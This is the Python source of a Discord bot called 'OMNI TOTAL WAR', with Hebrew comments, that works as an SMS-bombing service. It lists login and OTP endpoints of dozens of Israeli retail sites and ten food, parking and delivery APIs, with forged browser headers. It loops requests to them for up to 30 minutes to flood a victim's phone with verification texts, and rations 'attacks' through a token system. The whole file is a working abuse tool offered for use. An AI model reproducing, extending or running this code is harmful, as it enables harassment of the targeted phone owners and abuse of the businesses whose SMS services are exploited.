import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json

logging.basicConfig(level=logging.INFO)

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE")

bot = CyberBot()

# ========== MAGENTO CLUSTER (הכי חזק) ==========
MAGENTO_SITES = [
    "https://www.castro.com/customer/ajax/post/",
    "https://www.hoodies.co.il/customer/ajax/post/",
    "https://www.urbanica-wh.com/customer/ajax/post/",
    "https://www.crazyline.com/customer/ajax/post/",
    "https://www.onot.co.il/customer/ajax/post/",
    "https://www.timberland.co.il/customer/ajax/post/",
    "https://www.adikastyle.com/customer/ajax/post/",
    "https://www.weshoes.co.il/customer/ajax/post/",
    "https://www.ninewest.co.il/customer/ajax/post/",
    "https://www.fixunderwear.com/customer/ajax/post/",
    "https://www.intima-il.co.il/customer/ajax/post/",
    "https://www.gali.co.il/customer/ajax/post/",
    "https://www.golf-il.co.il/customer/ajax/post/",
    "https://www.kiwi-kids.co.il/customer/ajax/post/",
    "https://www.delta.co.il/customer/ajax/post/",
    "https://www.storyonline.co.il/customer/ajax/post/",
    "https://www.nautica.co.il/customer/ajax/post/",
    "https://www.lee-cooper.co.il/customer/ajax/post/",
    "https://www.shoesmarket.co.il/customer/ajax/post/",
    "https://www.tamman.co.il/customer/ajax/post/",
    "https://www.moda-child.co.il/customer/ajax/post/",
    "https://www.yangogo.co.il/customer/ajax/post/",
    "https://www.kapara.co.il/customer/ajax/post/",
    "https://www.bellababy.co.il/customer/ajax/post/",
    "https://www.pashosh.co.il/customer/ajax/post/",
    "https://www.sportwear.co.il/customer/ajax/post/",
    "https://www.running.co.il/customer/ajax/post/",
    "https://www.urbanplace.co.il/customer/ajax/post/",
    "https://www.american-vintage.co.il/customer/ajax/post/",
    "https://www.lacoste.co.il/customer/ajax/post/",
    "https://www.tommyhilfiger.co.il/customer/ajax/post/",
    "https://www.calvinklein.co.il/customer/ajax/post/",
    "https://www.underarmour.co.il/customer/ajax/post/",
    "https://www.skechers.co.il/customer/ajax/post/",
    "https://www.columbia.co.il/customer/ajax/post/",
    "https://www.merrell.co.il/customer/ajax/post/",
    "https://www.nike.co.il/customer/ajax/post/",
    "https://www.adidas.co.il/customer/ajax/post/",
    "https://www.puma.co.il/customer/ajax/post/",
    "https://www.newbalance.co.il/customer/ajax/post/",
    "https://www.converse.co.il/customer/ajax/post/",
    "https://www.vans.co.il/customer/ajax/post/",
    "https://www.asics.co.il/customer/ajax/post/",
    "https://www.reebok.co.il/customer/ajax/post/"
]

# ========== ADVANCED APIs (מה שנתת) ==========
ADVANCED_APIS = [
    {
        "name": "Hamal",
        "url": "https://users-auth.hamal.co.il/auth/send-auth-code",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://hamal.co.il",
            "Referer": "https://hamal.co.il/"
        },
        "data": {"value": "PHONE", "type": "phone", "projectId": "1"}
    },
    {
        "name": "Mishloha",
        "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://mishloha.co.il",
            "Referer": "https://mishloha.co.il/"
        },
        "data": {"phoneNumber": "PHONE"}
    },
    {
        "name": "Dominos_Advanced",
        "url": "https://api.dominos.co.il/sendOtp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://www.dominos.co.il",
            "Referer": "https://www.dominos.co.il/"
        },
        "data": {"otpMethod": "text", "customerId": "PHONE", "language": "he", "requestNum": 8}
    },
    {
        "name": "BurgerAnch",
        "url": "https://app.burgeranch.co.il/_a/aff_otp_auth",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://burgeranch.co.il",
            "Referer": "https://burgeranch.co.il/"
        },
        "data": "phone=PHONE",
        "is_form": True
    },
    {
        "name": "Ivory",
        "url": "https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/PHONE",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Origin": "https://www.ivory.co.il",
            "Referer": "https://www.ivory.co.il/"
        },
        "is_get": True
    },
    {
        "name": "Hopon",
        "url": "https://api.hopon.co.il/v0.15/1/isr/users",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://hopon.co.il",
            "Referer": "https://hopon.co.il/"
        },
        "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": "PHONE", "phoneCall": False}
    },
    {
        "name": "10bis",
        "url": "https://www.10bis.co.il/api/register",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://www.10bis.co.il",
            "Referer": "https://www.10bis.co.il/"
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "Pango",
        "url": "https://api.pango.co.il/auth/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://www.pango.co.il",
            "Referer": "https://www.pango.co.il/"
        },
        "data": {"phoneNumber": "PHONE_RAW"}
    },
    {
        "name": "McDonalds",
        "url": "https://www.mcdonalds.co.il/api/verify",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://www.mcdonalds.co.il",
            "Referer": "https://www.mcdonalds.co.il/"
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "BurgerKing",
        "url": "https://www.burgerking.co.il/api/auth",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://www.burgerking.co.il",
            "Referer": "https://www.burgerking.co.il/"
        },
        "data": {"phone": "PHONE"}
    }
]

# ========== פונקציות שליחה ==========
async def send_magento_sms(session, url, phone_raw):
    """שליחת SMS דרך Magento"""
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": url.replace("/customer/ajax/post/", ""),
        "Referer": url.replace("/customer/ajax/post/", "/")
    }
    
    try:
        async with session.post(url, data=data, headers=headers, timeout=10) as resp:
            return resp.status in [200, 201, 202], resp.status
    except:
        return False, 0

async def send_advanced_sms(session, api, phone, phone_raw):
    """שליחת SMS דרך APIs מתקדמים"""
    
    # הכנת URL ו-data
    if api.get("is_get", False):
        url = api["url"].replace("PHONE", phone)
        data = None
    elif api.get("is_form", False):
        url = api["url"]
        data = api["data"].replace("PHONE", phone)
    else:
        url = api["url"]
        # הכנת data
        data_str = json.dumps(api["data"])
        data_str = data_str.replace("PHONE", phone)
        data_str = data_str.replace("PHONE_RAW", phone_raw)
        data = json.loads(data_str)
    
    try:
        if api.get("is_get", False):
            async with session.get(url, headers=api["headers"], timeout=10) as resp:
                return resp.status in [200, 201, 202, 204], resp.status
        elif api.get("is_form", False):
            async with session.post(url, data=data, headers=api["headers"], timeout=10) as resp:
                return resp.status in [200, 201, 202, 204], resp.status
        else:
            async with session.post(url, json=data, headers=api["headers"], timeout=10) as resp:
                return resp.status in [200, 201, 202, 204], resp.status
    except Exception as e:
        return False, str(e)[:30]

async def run_attack(phone, duration_mins, user_id, interaction):
    """הרצת מתקפה משולבת"""
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    total_sent = 0
    magento_sent = 0
    advanced_sent = 0
    rounds = 0
    
    # הודעה ראשונית
    await interaction.followup.send(
        f"🎯 **מתקפה הופעלה!**\n"
        f"📱 טלפון: {phone}\n"
        f"⏱️ משך: {duration_mins} דקות\n"
        f"🎯 מג'נטו: {len(MAGENTO_SITES)} אתרים\n"
        f"📡 APIs מתקדמים: {len(ADVANCED_APIS)}",
        ephemeral=True
    )
    
    logging.info(f"🎯 Attack started - Phone: {phone}, Duration: {duration_mins}min")
    
    async with aiohttp.ClientSession() as session:
        while datetime.now() < end_time:
            rounds += 1
            round_magento = 0
            round_advanced = 0
            
            # שליחה למג'נטו (הכי חזק)
            for url in MAGENTO_SITES:
                success, status = await send_magento_sms(session, url, phone_raw)
                if success:
                    round_magento += 1
                    magento_sent += 1
                    total_sent += 1
            
            # שליחה ל-APIs המתקדמים
            for api in ADVANCED_APIS:
                success, status = await send_advanced_sms(session, api, phone, phone_raw)
                if success:
                    round_advanced += 1
                    advanced_sent += 1
                    total_sent += 1
            
            # עדכון כל 30 שניות
            if rounds % 3 == 0:
                minutes_passed = (datetime.now() - (end_time - timedelta(minutes=duration_mins))).seconds // 60
                rate = total_sent // (minutes_passed + 1)
                
                try:
                    await interaction.followup.send(
                        f"📊 **עדכון - {minutes_passed} דקות**\n"
                        f"✅ סה\"כ: {total_sent}\n"
                        f"🎯 מג'נטו: {magento_sent}\n"
                        f"📡 מתקדמים: {advanced_sent}\n"
                        f"⚡ קצב: {rate}/דקה",
                        ephemeral=True
                    )
                except:
                    pass
                
                logging.info(f"📊 Progress: {total_sent} total ({magento_sent} magento, {advanced_sent} advanced)")
            
            # המתנה של 8 שניות בין גלים
            await asyncio.sleep(8)
    
    # סיכום
    summary = (
        f"✅ **המתקפה הסתיימה!**\n"
        f"📱 טלפון: {phone}\n"
        f"⏱️ משך: {duration_mins} דקות\n"
        f"📊 סה\"כ הודעות: {total_sent}\n"
        f"🎯 מג'נטו: {magento_sent}\n"
        f"📡 מתקדמים: {advanced_sent}\n"
        f"📈 ממוצע: {total_sent//duration_mins} לדקה"
    )
    
    try:
        await interaction.followup.send(summary, ephemeral=True)
    except:
        pass
    
    logging.info(f"✅ Attack completed - Total: {total_sent}")

# ========== פקודות בדיקה ==========
@bot.tree.command(name="test_advanced", description="בדוק API מתקדם ספציפי")
async def test_advanced(interaction: discord.Interaction, api_number: int = 1):
    """בדיקת API מתקדם"""
    
    if api_number < 1 or api_number > len(ADVANCED_APIS):
        await interaction.response.send_message(f"❌ מספר לא תקין. 1-{len(ADVANCED_APIS)}", ephemeral=True)
        return
    
    api = ADVANCED_APIS[api_number - 1]
    
    await interaction.response.send_message(f"🔄 בודק {api['name']}...", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    
    async with aiohttp.ClientSession() as session:
        success, status = await send_advanced_sms(session, api, test_phone, test_raw)
        
        if success:
            await interaction.followup.send(f"✅ {api['name']} עובד! (סטטוס {status})", ephemeral=True)
        else:
            await interaction.followup.send(f"❌ {api['name']} נכשל: {status}", ephemeral=True)

@bot.tree.command(name="test_magento", description="בדוק אתר מג'נטו ספציפי")
async def test_magento(interaction: discord.Interaction, site_number: int = 1):
    """בדיקת אתר מג'נטו"""
    
    if site_number < 1 or site_number > len(MAGENTO_SITES):
        await interaction.response.send_message(f"❌ מספר לא תקין. 1-{len(MAGENTO_SITES)}", ephemeral=True)
        return
    
    url = MAGENTO_SITES[site_number - 1]
    site_name = url.split("//")[1].split(".")[0]
    
    await interaction.response.send_message(f"🔄 בודק {site_name}...", ephemeral=True)
    
    test_raw = "0501234567"
    
    async with aiohttp.ClientSession() as session:
        success, status = await send_magento_sms(session, url, test_raw)
        
        if success:
            await interaction.followup.send(f"✅ {site_name} עובד! (סטטוס {status})", ephemeral=True)
        else:
            await interaction.followup.send(f"❌ {site_name} נכשל: {status}", ephemeral=True)

# ========== ממשק משתמש ==========
class AttackModal(ui.Modal, title="💣 OMNI TOTAL WAR"):
    phone = ui.TextInput(label="📱 מספר טלפון", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ משך בדקות", default="5", placeholder="1-30")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב להתחיל ב-972", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 30:
                await interaction.response.send_message("❌ משך חייב להיות 1-30 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ משך לא תקין", ephemeral=True)
            return
        
        # בדיקת טוקנים
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 10})
            user_doc = {"tokens": 10}
        
        if user_doc.get("tokens", 0) < 1:
            await interaction.response.send_message("❌ אין לך טוקנים! השתמש ב-/setup", ephemeral=True)
            return
        
        # הורדת טוקן
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        embed = discord.Embed(title="🚀 מתקפה הופעלה!", color=0xff0000)
        embed.add_field(name="📱 טלפון", value=phone, inline=True)
        embed.add_field(name="⏱️ משך", value=f"{duration} דקות", inline=True)
        embed.add_field(name="🎯 מג'נטו", value=len(MAGENTO_SITES), inline=True)
        embed.add_field(name="📡 מתקדמים", value=len(ADVANCED_APIS), inline=True)
        embed.add_field(name="💎 טוקנים נותרים", value=user_doc["tokens"] - 1, inline=True)
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
        # הפעלת המתקפה
        asyncio.create_task(run_attack(phone, duration, user_id, interaction))

@bot.tree.command(name="setup", description="פתח את פאנל השליטה")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 15})
        tokens = 15
    else:
        tokens = user_doc.get("tokens", 0)
    
    embed = discord.Embed(
        title="⚡ OMNI TOTAL WAR - ULTIMATE EDITION",
        description=f"**{len(MAGENTO_SITES)}** מג'נטו + **{len(ADVANCED_APIS)}** APIs מתקדמים",
        color=0x00ff00
    )
    embed.add_field(name="💎 הטוקנים שלך", value=f"**{tokens}**", inline=True)
    embed.add_field(name="🎯 עוצמה", value="מקסימלית", inline=True)
    embed.add_field(name="📊 סטטוס", value="✅ פעיל", inline=True)
    
    view = discord.ui.View()
    attack_btn = discord.ui.Button(label="💣 הפעל מתקפה", style=discord.ButtonStyle.danger, emoji="⚡")
    
    async def attack_callback(inter):
        await inter.response.send_modal(AttackModal())
    
    attack_btn.callback = attack_callback
    view.add_item(attack_btn)
    
    # כפתורי בדיקה
    test_magento_btn = discord.ui.Button(label="🔍 בדוק מג'נטו", style=discord.ButtonStyle.secondary)
    async def test_magento_callback(inter):
        await inter.response.send_message("השתמש ב-/test_magento [1-45]", ephemeral=True)
    test_magento_btn.callback = test_magento_callback
    view.add_item(test_magento_btn)
    
    test_advanced_btn = discord.ui.Button(label="🔬 בדוק מתקדמים", style=discord.ButtonStyle.secondary)
    async def test_advanced_callback(inter):
        await inter.response.send_message("השתמש ב-/test_advanced [1-10]", ephemeral=True)
    test_advanced_btn.callback = test_advanced_callback
    view.add_item(test_advanced_btn)
    
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="tokens", description="בדוק טוקנים")
async def check_tokens(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    tokens = user_doc.get("tokens", 0) if user_doc else 0
    
    embed = discord.Embed(title="💎 מאזן טוקנים", color=0x00ff00)
    embed.add_field(name="טוקנים זמינים", value=f"**{tokens}**", inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

if __name__ == "__main__":
    logging.info("🚀 Starting OMNI TOTAL WAR - ULTIMATE EDITION...")
    bot.run(TOKEN)
